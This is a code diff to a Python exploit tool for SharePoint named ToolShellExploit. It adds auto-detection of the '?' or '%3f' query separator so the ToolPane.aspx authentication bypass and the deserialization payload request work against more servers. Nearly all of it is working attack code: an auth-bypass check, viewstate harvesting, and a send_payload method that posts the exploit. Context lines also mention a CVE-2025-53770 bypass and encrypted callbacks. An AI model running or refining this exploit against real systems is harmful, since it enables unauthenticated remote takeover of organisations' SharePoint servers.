@@ -120,6 +120,7 @@ class ToolShellExploit:
         self.use_bypass = False  # Will be set automatically if needed
         self.bypass_mode_active = False  # Track if we're using CVE-2025-53770 bypass
         self.verbose = verbose  # Control debug output verbosity
+        self.query_separator = None  # Auto-detect: '?' or '%3f' based on what works
         
         # Generate XOR key for encrypted callbacks
         CALLBACK_XOR_KEY = generate_xor_key()
@@ -199,6 +200,46 @@ class ToolShellExploit:
         with gzip.GzipFile(fileobj=buf, mode='rb') as gz:
             return gz.read()
     
+    def build_url_with_params(self, path, params):
+        """
+        Build URL with query parameters using the correct separator.
+        Auto-detects if '?' or '%3f' works and caches the result.
+        
+        Args:
+            path: URL path (e.g., TOOLPANE_PATH)
+            params: Query string parameters (without leading ? or %3f)
+        
+        Returns:
+            Full URL with proper separator
+        """
+        # If we already know which separator works, use it
+        if self.query_separator:
+            return f"{self.target}{path}{self.query_separator}{params}"
+        
+        # Try both separators and detect which one works
+        for separator in ['?', '%3f']:
+            test_url = f"{self.target}{path}{separator}{params}"
+            headers = self.get_auth_bypass_headers()
+            
+            try:
+                resp = self.session.get(test_url, headers=headers, timeout=self.timeout, allow_redirects=False)
+                
+                # Success codes: 200, 302 (redirect), 500 (sometimes deserialization)
+                if resp.status_code in [200, 302, 500]:
+                    self.query_separator = separator
+                    if self.verbose:
+                        print(f"[DEBUG] Query separator detected: '{separator}'")
+                    return test_url
+                
+            except Exception as e:
+                if self.verbose:
+                    print(f"[DEBUG] Failed with '{separator}': {e}")
+                continue
+        
+        # Default to %3f if both failed (for compatibility with original behavior)
+        self.query_separator = '%3f'
+        return f"{self.target}{path}{self.query_separator}{params}"
+    
     def get_sharepoint_version(self):
         """Detect SharePoint version via OPTIONS request"""
         try:
@@ -216,8 +257,9 @@ class ToolShellExploit:
         """
         Check if target is potentially vulnerable by testing auth bypass.
         A vulnerable server will return 200/302 without auth when using the bypass referer.
+        Auto-detects if '?' or '%3f' encoding is needed.
         """
-        url = f"{self.target}{TOOLPANE_PATH}?{TOOLPANE_PARAMS}"
+        url = self.build_url_with_params(TOOLPANE_PATH, TOOLPANE_PARAMS)
         
         # Use full URL for Referer - some SharePoint configs require it
         headers = {
@@ -230,7 +272,8 @@ class ToolShellExploit:
             
             # Vulnerable if we get 200 or 302 (not 401/403)
             if resp.status_code in [200, 302]:
-                return True, resp.status_code
+                status_msg = f"{resp.status_code} (using '{self.query_separator}' separator)"
+                return True, status_msg
             return False, resp.status_code
         except Exception as e:
             return False, str(e)
@@ -796,7 +839,9 @@ runat="server" AssociatedUpdatePanelID="upTest">
         """
         # Default to ToolPane.aspx but this works on many pages
         if target_page is None:
-            target_page = f"{self.target}{TOOLPANE_PATH}?{TOOLPANE_PARAMS}"
+            if not self.query_separator:
+                _ = self.build_url_with_params(TOOLPANE_PATH, TOOLPANE_PARAMS)
+            target_page = f"{self.target}{TOOLPANE_PATH}{self.query_separator}{TOOLPANE_PARAMS}"
         elif not target_page.startswith('http'):
             target_page = f"{self.target}{target_page}"
         
@@ -910,7 +955,9 @@ runat="server" AssociatedUpdatePanelID="upTest">
         """
         # Resolve target page
         if target_page is None:
-            target_page = f"{self.target}{TOOLPANE_PATH}?{TOOLPANE_PARAMS}"
+            if not self.query_separator:
+                _ = self.build_url_with_params(TOOLPANE_PATH, TOOLPANE_PARAMS)
+            target_page = f"{self.target}{TOOLPANE_PATH}{self.query_separator}{TOOLPANE_PARAMS}"
         elif not target_page.startswith('http'):
             target_page = f"{self.target}{target_page}"
         
@@ -1040,7 +1087,10 @@ runat="server" AssociatedUpdatePanelID="upTest">
             dict with 'viewstate', 'viewstategenerator', 'eventvalidation', 'page_url' or None if failed
         """
         if page_url is None:
-            url = f"{self.target}{TOOLPANE_PATH}?{TOOLPANE_PARAMS}"
+            # Ensure separator is detected
+            if not self.query_separator:
+                _ = self.build_url_with_params(TOOLPANE_PATH, TOOLPANE_PARAMS)
+            url = f"{self.target}{TOOLPANE_PATH}{self.query_separator}{TOOLPANE_PARAMS}"
         else:
             url = page_url if page_url.startswith('http') else f"{self.target}{page_url}"
         
@@ -1097,9 +1147,13 @@ runat="server" AssociatedUpdatePanelID="upTest">
     def send_payload(self, dwp_payload, verbose=False):
         """
         Send the exploit POST request with the given DWP payload.
-        Matches the working l0ggg/ToolShell PoC structure.
+        Uses auto-detected query separator ('?' or '%3f').
         """
-        url = f"{self.target}{TOOLPANE_PATH}?{TOOLPANE_PARAMS}"
+        # Ensure we've detected the right separator (build_url_with_params does auto-detect)
+        if not self.query_separator:
+            _ = self.build_url_with_params(TOOLPANE_PATH, TOOLPANE_PARAMS)
+        
+        url = f"{self.target}{TOOLPANE_PATH}{self.query_separator}{TOOLPANE_PARAMS}"
         
         # Headers matching the working PoC - relative Referer path
         headers = {
